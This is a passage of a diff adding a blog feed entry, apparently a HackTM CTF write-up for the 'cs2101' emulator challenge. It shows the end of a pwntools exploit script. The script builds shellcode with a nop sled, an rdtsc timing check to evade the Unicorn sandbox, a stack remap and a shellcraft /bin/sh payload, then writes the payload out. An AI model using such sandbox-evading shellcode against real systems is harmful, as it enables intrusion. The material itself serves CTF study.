+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;rdtsc</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;mov r9, rax</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;shl rdx, 32</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;or r9, rdx</span><span class="se">\n</span><span class="s2">&#34;</span>
+        
+        <span class="s2">&#34;sub r9, r8</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;cmp r9, 0x100</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;jg sandbox</span><span class="se">\n</span><span class="s2">&#34;</span>
+        
+        <span class="s2">&#34;mov rax, 0x100006a</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;jmp rax</span><span class="se">\n</span><span class="s2">&#34;</span>
+
+        <span class="s2">&#34;sandbox:</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;hlt</span><span class="se">\n</span><span class="s2">&#34;</span>
+    <span class="p">)</span>
+
+    <span class="n">map_stack</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;mov rsp, 0x1000000</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+    <span class="n">map_stack</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;add rsp, 0x500</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+    
+    <span class="n">shell</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">asm</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="n">shellcode</span> <span class="o">+</span> <span class="n">map_stack</span> <span class="o">+</span> <span class="n">shell</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">shellcode</span> <span class="o">+</span> <span class="n">map_stack</span> <span class="o">+</span> <span class="n">shell</span><span class="p">))</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">shellcode</span> <span class="o">+</span> <span class="n">map_stack</span> <span class="o">+</span> <span class="n">shell</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+    <span class="n">exp</span><span class="p">()</span>
+</code></pre></div>]]></content>
+            
+                 
+                    
+                 
+                    
+                         
+                        
+                            
+                             
+                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
+                             
+                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
+                             
+                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
+                             
+                                <category scheme="https://nasm.re/tags/linux" term="linux" label="linux" />
+                             
+                                <category scheme="https://nasm.re/tags/hacktm" term="hacktm" label="hacktm" />
+                             
+                                <category scheme="https://nasm.re/tags/cs2101" term="cs2101" label="cs2101" />
+                             
+                                <category scheme="https://nasm.re/tags/emulator" term="emulator" label="emulator" />
+                             
+                                <category scheme="https://nasm.re/tags/shellcoding" term="shellcoding" label="shellcoding" />
+                             
+                                <category scheme="https://nasm.re/tags/unicorn" term="unicorn" label="unicorn" />
+                            
+                        
+                    
+                
+            
+        </entry>
+    
+</feed>
